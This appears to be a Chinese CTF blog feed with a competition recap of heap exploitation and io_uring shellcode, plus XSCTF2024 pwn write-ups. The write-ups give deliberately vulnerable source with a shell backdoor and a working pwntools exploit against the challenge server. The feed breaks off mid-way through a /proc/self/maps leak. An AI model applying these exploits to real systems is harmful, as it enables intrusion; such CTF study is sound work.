<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>网鼎&amp;拟态总结</title>
      <link href="/2024/11/26/%E7%BD%91%E9%BC%8E-%E6%8B%9F%E6%80%81%E6%80%BB%E7%BB%93/"/>
      <url>/2024/11/26/%E7%BD%91%E9%BC%8E-%E6%8B%9F%E6%80%81%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<p>​上一个星期去了强网拟态和网鼎杯的线下赛，总计参与做出了3道pwn题。强网拟态的强度是让人一直在打并且沉浸在里面的，网鼎杯只有4小时ctf时间说实话对我来说是真的太短了，我出的这3道pwn题跟平时的堆题不一样，这三道堆题让我得到了更广阔的视野和更有用的shellcode编写能力，简单来说就是对我的影响很大，这里就来简单分析一下一路上做题的心得和感受。</p><h1 id="QWNT"><a href="#QWNT" class="headerlink" title="QWNT"></a>QWNT</h1><p>​如果要我选择这两个比赛谁带给我的影响最大？那么我将毫不犹豫地选择强网拟态，强网拟态ctf上了三波题，我只看pwn，但是我菜，题目看上去很难，其实一点也不简单。</p><p>​不过这里并不急着聊聊CTF，而是聊聊qwnt的iot&#x2F;车联网和无人机固件，本来以为就是简单的用firmware之类的固件分析软件分析，找到一个vuln相关的ELF文件，但是呢实际上并不是这样的。在qwnt的前几天的突击学习也让我学到了很多车联网安全的系统理论，虽然比赛题目一个都不会（也不能这么说，有一些场景题目，其系统崩溃就有分，只不过我们不是很懂要做什么而搞崩溃的，其实不是很有含金量），但是这一两天的学习速度相当的可怕，对车的理解也是比较清晰了。固件分析其实可以先问问AI这个固件后缀怎么分析，另一个就是搜相关产品的固件分析的方法，有一些人已经分析过了会提前写在blog上面。这里就简单说下.fw.sig，一开始想用开源的解密软件去解密sig文件，但是没有秘钥，其实怎么解密都是失败。偶然间看了别人blog，其实可以改后缀自己解压缩，就会提取出来一个bin文件，然后分析固件即可（但是我后面遇到了很大的问题，就是一个1g的bin提取了超过40G的二进制文件，我并不知道这是正常的还是非正常的。）</p><p>​qwnt其他部分基本上就聊完了，真没做什么，因为真不会做，后来问了圈圈，发现圈圈也是这么想的，那我就放心了<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732589712640-a3652b84-145f-4c24-ab45-cd155c197649.png" alt="img">。那么就来聊聊我们最熟悉的pwn吧。</p><h2 id="jemalloc浅谈"><a href="#jemalloc浅谈" class="headerlink" title="jemalloc浅谈"></a>jemalloc浅谈</h2><p>​第一道放的是一道jemalloc，当时我们是大概三四个小时找不到漏洞，后来跟圈圈聊，圈圈直接说他一眼丁真就看出来了，我当时想上去就是一拳<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732588987803-2773248c-bb84-48c8-84e8-932ba25d28fe.png" alt="img">。这并不是常规的堆分配器，而是新遇到的jemalloc，它的堆分配方式和内核真的非常相像，都有slab的概念，其实简单调一调不难理解其的堆分配过程。</p><p>​以我的话来概括，有一个地方存着各个大小freelist，一个地方存放着相同大小的object指针以供后来分配或者释放使用，再有一个地方就是我们的chunk了&#x2F;object了，其是由一个slab切割相同大小得到的小块。</p><p>​漏洞不仔细看真不好看出来，之前确实没有想过这方面的问题，关注到case4和case6的free函数，其对指针的解析并不相同，如果你进一步fuzz，程序就会发生崩溃。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732589837157-9d3036b5-4a28-409b-95d9-4eb308cb5bc5.png" alt="img"></p><p>​问题就出在这里。解决了这个，后面就很简单了，就是覆写堆指针和func指针，还有泄露libc地址之类的。</p><h2 id="heap-legend浅谈"><a href="#heap-legend浅谈" class="headerlink" title="heap_legend浅谈"></a>heap_legend浅谈</h2><h3 id="堆风水杂谈"><a href="#堆风水杂谈" class="headerlink" title="堆风水杂谈"></a>堆风水杂谈</h3><p>​说到这道题，就不得不艾特一下圈圈<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732590128149-76671c55-f5ff-412c-a1f0-ed1ee6e1e44f.png" alt="img">了，tql，如果他亲手来做应该是很快秒了拿一血。但是他们当时去看kernel了（OTZ，kernel还是二血)。这道题的限制可能相对没有那么多，因为存在EAF，但是不能泄露使得这道题必定走上难题的道路。</p><p>​那么这道题就首先面临两个问题：“要爆破，还是要泄露？”。好的，其实两个都要，那我们要确定如何去leak？这里就涉及IO_leak stdout了，但是在2.39攻击stdout并不容易。</p><p>​因为我们一开始并不能拿到堆地址，而且如果使用house of rust等无需leak的方法，实际上会受到tcache的加密和unsorted 双链检查的限制。</p><p>​不过我们再次确定思路，如果我们一定要IOLeak，就必须要分配到libc的地址，什么bin中的chunk可以帮助我们达到这个目的呢？那必须是tcache，如果风水构造妥当，它必然是可以任意分配造成任意写的最佳答案。那么就有另一个问题出来了，就是如何利用tcache去分配libc地址的chunk。我们现在不能够泄露堆地址和libc地址，只有一个EAF，能够打largebin attack，只有tcache加解密的部分秘钥。其实让tcache分配到libc上最简单的方法就是让tcache_struct上面能够写有libc地址，如何做到呢？不急，我们先来总结我们能够做什么？</p><p>​基于上述条件largebin attack只能够堆地址范围内写一个堆地址，largebin可以帮助我们伪造双链，unsorted bin和small bin都有libc地址，同时双链比largebin更好伪造。那么这有一个思路就是基于unsorted bin和small bin在tcache_struct上伪造双链，这样一来就能够在在tcache_struct上面能够写有libc地址（当时就是这么想的，只不过真的没想到要怎么做）。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732592307143-7d043fb2-5e7d-44b1-a32e-890e0e481a4c.png" alt="img"></p><p>​如果要伪造双链，就得在它上面写两个堆地址，其实这正是largebin attack能做到的，但是我一开始尝试没有漏洞的堆风水去做，结果是并不太如意，就差一点点，不知道能不能够实现。写上libc地址之后，或者说tcache_struct染上libc之后，首先要考虑的就是如何去改写上面的libc地址。这表明我们要通过双链检测机制和unsorted bin分配机制，把chunk分配在tcache_struct上面，这一步就得去用house of water手法了，这里由于不是我做的前半部分，我就不做解析，就选择和你们一起学习去了。</p><p>​至此对于heap_legend的攻击思路明确，就很简单了，当然后面还有io_uring。我后面简单说一说编写经验吧。</p><p>​这题因为EAF的漏洞，其实我们堆的能力还是很强，这里还有第二种思路去打IO_leak。</p><p>​首先其实一个关键性的问题就是我们如何能够控制tcache_struct，第二个就是如何写上libc地址。我们如果先思考第一个问题，再思考我们能够打largebin attack写一个堆地址。其实也不难想到可以用largebin attack部分地位写tcache_struct上的指针。如果我们恰好第一个分配的chunk（也就是紧紧跟在tcache_struct后面的chunk）能够被覆盖，那么我们就能够控制tcache_struct的后半部分，紧跟着再写一个堆地址，再通过控制的chunk去改写，就存在可能控制整一个tcache_struct。之后也是简单的伪造双链，让tcache_struct上染上libc地址。</p><p>​至此第二种思路结束。</p><p>​对比：第一种思路利用unsorted bin两次分配通过unsorted bin拿到了unsorted chunk在tcache_struct上面。第二种思路只利用了一次unsorted bin一次分配让tcache_struct上染上libc地址。这里我就不说多了，你细品，如果品出来了，这道题绝对能给巨大的收获。</p><h3 id="io-uring编写杂谈"><a href="#io-uring编写杂谈" class="headerlink" title="io_uring编写杂谈"></a>io_uring编写杂谈</h3><p>​这道题的后半部分由我来完成：那就是io_uring的编写，以前懒得学的，还是要补回来的，┭┮﹏┭┮，也是边吃边玩边写，最后wdb的前一个晚上一鼓作气两点半写完shellcode，打通远程。</p><p>​这道题目ban了所有的open函数，这就必须要用到最极端的io_uring了，如何去编写io_uring的orw版本必然是shellcode学习者很难解决的一个大问题。</p><p>​我们这里简单说一下编写思路（用musl和glibc编译都行，看你选择用什么），具体shellcode真要学习，非常建议根据下面步骤具体写一遍。</p><p>​首先肯定先用c去写一遍，要用liburing库区简化整一个过程，最好只是实现一个open操作；第二就是编译出一个静态文件，拖进IDA里面去分析；第三，根据ACTF已经存在的wp，其中的io_uring shellcode其实只是完成了关键部分（比如初始化uring结构体），并且可能存在汇编代码偏差，你需要根据这些部分去完善你的orw操作（根据IDA去copy，让AI改写语法格式等）。第四，就是在简单编写的shellcode题上测试，看到底卡在哪里了，是初始化分配错误吗？还是地址分配的有问题？</p><p>​走完上面这四步，恭喜你，成功学会了io_uring的编写！</p><p>​pwntools貌似有把ELF文件解析成shellcode代码的函数？这个听圈圈了解，不过我们两个都不熟悉，还是尝试手搓+copy。</p><h1 id="wdb浅谈"><a href="#wdb浅谈" class="headerlink" title="wdb浅谈"></a>wdb浅谈</h1><p>​wdb4小时的ctf pwn我只能出一题（当时就是想能出就是win），card_master。我出的时候是七解，此时距离ctf比赛结束还有一个半小时。非CTF方向的我是一点不会，web和渗透方面我也只是会简单的用用扫描工具罢了。。。</p><h2 id="CardMaster"><a href="#CardMaster" class="headerlink" title="CardMaster"></a>CardMaster</h2><p>​本题libc版本2.27，Ubuntu GLIBC 2.27-3ubuntu1，老版本的2.27tcache是可以直接double free的。</p><p>​根据纸牌来分配堆，纸牌的花色数量和每个花色拥有的纸牌数量由你来指定。存储纸牌的信息堆块和还有花色的堆块指针的集合堆指针都在一个大堆上管理。并且有func函数指针，那么只要我们劫持func，就可以打通本题。</p><p>​如果你能够fuzz出来，或者能够看出来，其实这道题是存在非常好用的double free的，让我没想到的是，这道题竟然让圈圈苦苦盯了四个小时<img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1732594175866-98e20640-3217-48ac-b78c-3d30fd140f63.png" alt="img">（因为找洞的事情，那个free函数看起来太正常了，按照平常来说应该是没有问题的，但是这是libc2.27老版本)。不过后面其实测出了double free，或者看出具体有什么问题，发现之后也是很快就秒了。</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​这三天打的挺累的，因为自己确实菜，水平有限，很多不会的题目，上面解出来的题目对于我来说都是相对不那么容易的。时间过得真快，转眼过去已经大三上快结束了，回想过去，那个沉迷于pwn的少年还在图书馆苦苦研究准备新生赛ret2libc的记忆并不久远，但时间就是白驹过隙，如大江一般奔流而不复回。个人的进步遇到的阻碍却依然是以前一样的挑战，不禁让人感慨，这两年半，我到底改变了什么，我很难说出来。我选择考研，是为了更好的学习安全的知识，这确实是我热爱的，但是为什么我的热爱无法击败我面对的阻碍呢？答案或许很重要，但是眼下更重要的是，明白怎么去做。时间不等人，平生心力为何尽？一事无成空相守。剩下的时间，做自己喜欢的事情就好。</p><p>​我很喜欢《揪心的玩笑和漫长的白日梦》的一句词：<strong>“就在一瞬间，握紧我矛盾密布的手”</strong>，喜欢的原因可能是很有感触吧。</p>]]></content>
      
      
      <categories>
          
          <category> 总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 碎碎念 </tag>
            
            <tag> 二进制知识 </tag>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSCTF2024pwn出题笔记&amp;wp</title>
      <link href="/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/"/>
      <url>/2024/11/09/XSCTF2024pwn%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0-wp/</url>
      
        <content type="html"><![CDATA[<p>这次出了三道题（一道新生专属难度，两道中等难度）</p><p>这次没有出困难题，但是中等题其实也足够困难了。</p><p>结合其他师傅的出题，感觉上比较缺少过渡的出题，造成现象旱的旱死，涝的涝死（qy师傅出的不错，也很有意思）</p><h1 id="eke1j">【新生专属】c_master</h1><p>:::info<br>题目描述</p><p><font style="color:rgb(213, 215, 215);background-color:rgb(29, 30, 30);">请使用简单的C语句对程序进行getshell吧！</font></p><p>:::</p><p>下面是题目源码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span>   </span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">init</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">    <span class="keyword">return</span>; </span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span>;</span><br><span class="line"><span class="type">void</span> <span class="title function_">backdoor</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="type">char</span> base[<span class="number">8</span>];</span><br><span class="line">    <span class="type">int</span> baseidx=<span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span>* <span class="built_in">string</span>=<span class="built_in">malloc</span>(<span class="number">1024</span>);</span><br><span class="line">    <span class="built_in">memset</span>(<span class="built_in">string</span>,<span class="number">0</span>,<span class="number">1024</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Try to write a C getshell program with my code!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;read(0,base,0x8);&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;write(1,base,0x8);&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;base+=8;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;base-=8;&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;return 0;&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;&gt;&gt;&gt;&quot;</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%128s&quot;</span>,<span class="built_in">string</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;read(0,base,0x8);&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;input:&quot;</span>);</span><br><span class="line">            read(<span class="number">0</span>,&amp;base[baseidx],<span class="number">0x8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;write(1,base,0x8);&quot;</span>))&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;output:&quot;</span>);</span><br><span class="line">            write(<span class="number">1</span>,&amp;base[baseidx],<span class="number">0x8</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;base+=8;&quot;</span>))&#123;</span><br><span class="line">            baseidx+=<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;base-=8;&quot;</span>))&#123;</span><br><span class="line">            baseidx-=<span class="number">8</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="built_in">string</span>,<span class="string">&quot;return 0;&quot;</span>))&#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;No such code...&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc  xxx.c -no-pie -o xxx</span></span><br></pre></td></tr></table></figure><h2 id="KKWD0">0x1 逆向分析</h2><p>checksec查看，没开pie保护，elf地址对我们是透明的。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776296118-95d9faa0-57bb-40d2-aed4-5d182c6d5ccf.png"></p><p>拖进IDA分析，看看main函数干了什么？</p><p>首先申请了一个0x400的堆块，然后scanf读取输入写到堆上。</p><p>然后调用strcmp比较输入的字符串和目标字符串。</p><p>如代码所示，read和write都是针对（base~base+0x7）这一块内存进行读写操作。</p><p>所以我们得看看base在哪里，这里的base就是我们的v6[v4]</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776497990-1d913b9e-0a4c-4675-a76b-5c9a679dfadf.png"></p><p>注意到base+&#x3D;8是 v4+&#x3D;8，v4是索引</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776518870-529b70bb-2aea-48cb-bebf-ab97d23e06a6.png"></p><p>v6就是base，索引没做限制，这就是数组溢出。</p><p>base到ret的距离是v10到return_address的距离 也就是0x10+0x8&#x3D;0x18，所以只需要让v4移动三次。</p><p>栈底是高地址，所以我们得让v4+&#x3D;8进行三次操作；</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776561485-267a2b36-cd18-48fa-978d-eeeb077c6303.png"></p><p>此处我们直接覆盖ret返回地址，只要不对canary进行改写，就不会触发canary保护。</p><p>如果直接返回backdoor函数有栈平衡问题</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776831632-ff9f217c-3214-4a36-b165-56163ec00b16.png"></p><p>只需要跳过push rbp指令即可</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730776853694-57a1d0e9-4fd7-4af7-bda0-a02a09adbb40.png"></p><h2 id="PrugN">0x2 思路总结</h2><p>通过数组溢出，覆盖ret为backdoor地址（0x4012BB ），但是有栈平衡问题，需要跳过一个push指令，所以覆盖为0x4012C0。</p><h2 id="eP23o">0x3 exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="comment">#p=process(&quot;./c_master&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;43.248.97.213&quot;</span>,<span class="number">30219</span>)<span class="comment">#019843.248.97.213:</span></span><br><span class="line">system=<span class="number">0x4012c0</span></span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;base+=8;&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;write(1,base,0x8);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;read(0,base,0x8);&quot;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.send(p64(system))</span><br><span class="line">p.sendline(<span class="string">&quot;return 0;&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h1 id="vB3fp">Wahahabox</h1><p>题目描述：</p><h2 id="Pf3f5">0X1 逆向分析</h2><p>check一下二进制程序，发现没开canary，但是开了pie。</p><p><img src="https://xswlhhh12345-blog-test.oss-cn-guangzhou.aliyuncs.com/img/1730777185430-4c928bcd-0431-4de1-8f7b-85745f13077f.png"></p><p>拖进IDA进行逆向</p><p>main函数如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE buf[<span class="number">32</span>]; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;If you want to open the box, what do you want to say to Wahaha?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%31s&quot;</span>, buf);</span><br><span class="line">  gift(buf);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Try to open&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们先计算buf到ret的距离，计算得0x20+0x8</p><p>所以第一个scanf(“%31s”)；我们是无法覆盖ret的，第二个read(0,bu,0x40)；能够覆盖ret，但是只能构造一个p64(pop_rdi )+p64 (数据) + p64(返回地址)的ROP链。</p><p>然后跟进gift函数，看看能给什么信息。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> __fastcall <span class="title function_">gift</span><span class="params">(<span class="type">const</span> <span class="type">char</span> *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  _BYTE s[<span class="number">2060</span>]; <span class="comment">// [rsp+10h] [rbp-810h] BYREF</span></span><br><span class="line">  <span class="type">int</span> fd; <span class="comment">// [rsp+81Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strstr</span>(a1, <span class="string">&quot;flag&quot;</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;It&#x27;s a secret :)&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  fd = open(a1, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( fd &lt; <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Open box fail :(&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Wahaha left you the keys&quot;</span>);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x800</span>uLL);</span><br><span class="line">  read(fd, s, <span class="number">0x800</span>uLL);</span><br><span class="line">  <span class="keyword">return</span> write(<span class="number">1</span>, s, <span class="number">0x800</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里open会根据我们字符串去打开一个文件（第二个参数决定以只读形式打开），而且如果我们字符串中有flag这个子字符串（可以去查找strstr函数的功能）就会退出程序。</p><p>然后给了很大的栈空间，来读取文件的内容并输出。</p><p>其实看到这里了解相关知识点的人就能想到利用&#x2F;proc&#x2F;self&#x2F;maps这个文件去泄露 <strong>程序相关的映射地址</strong>了。</p><blockquote><p>放出tips：&#x2F;proc下的文件很有用</p></blockquote><p>其实非常有必要去学习一下这个文件夹。web和pwn其实都有用。</p><p>在本地执行，open打开&#x2F;proc&#x2F;self&#x2F;maps终端输出如下，这里要接收libc.so的地址，这里以接收 <strong>b’55edda100000-55edda121000 rw-p 00000000 00:00 0                          [heap]\n’<strong>中的</strong>子字符串</strong></p><p><strong>“[heap]\n”</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">    b<span class="number">&#x27;55</span>edd95bc000<span class="number">-55</span>edd95bd000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95bd000<span class="number">-55</span>edd95be000 r-xp <span class="number">00001000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95be000<span class="number">-55</span>edd95bf000 r--p <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95bf000<span class="number">-55</span>edd95c0000 r--p <span class="number">00002000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edd95c0000<span class="number">-55</span>edd95c1000 rw-p <span class="number">00003000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">1835165</span>                    /home/qwq/ctf/ctf2024/<span class="number">2024</span>xsctf/origin/wahahabox/wahahabox\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;55</span>edda100000<span class="number">-55</span>edda121000 rw-p <span class="number">00000000</span> <span class="number">00</span>:<span class="number">00</span> <span class="number">0</span>                          [heap]\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30600000<span class="number">-768</span>d30628000 r--p <span class="number">00000000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30628000<span class="number">-768</span>d307bd000 r-xp <span class="number">00028000</span> <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d307bd000<span class="number">-768</span>d30815000 r--p <span class="number">001b</span>d000 <span class="number">08</span>:<span class="number">03</span> <span class="number">919725</span>                     /usr/lib/x86_64-linux-gnu/libc.so<span class="number">.6</span>\n<span class="number">&#x27;</span></span><br><span class="line">    b<span class="number">&#x27;768</span>d30815000<span class="number">-768</span>d30816000 ---p <span 